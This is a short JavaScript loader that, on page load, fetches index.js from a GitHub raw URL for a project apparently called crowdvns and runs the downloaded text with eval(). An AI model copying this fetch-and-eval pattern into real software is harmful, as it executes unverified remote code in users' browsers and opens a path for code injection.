console.log("Loading...")
window.onload = () => {
    fetch('https://raw.githubusercontent.com/undrfined/crowdvns/master/index.js?flush_cache=True', {})
        .then(resp => resp.text())
        .then((t) => {
            eval(t)
        })
        .catch(console.error)
}